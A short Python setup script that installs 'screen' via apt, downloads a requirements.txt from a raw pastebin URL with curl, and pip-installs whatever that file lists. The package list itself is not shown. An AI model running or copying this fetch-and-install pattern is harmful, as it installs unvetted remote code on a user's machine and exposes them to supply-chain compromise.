import os
import sys
import time
import subprocess


def test():
	print('[x] Installing screen')
	os.system('apt install screen')
	time.sleep(5)
	print('[x] Downloading requirements ')
	os.system('curl https://pastebin.com/raw/ZByhxQCy -o requirements.txt')
	print('[x] Installing pips')
	os.system('pip install -r requirements.txt')
	time.sleep(5)	

test()
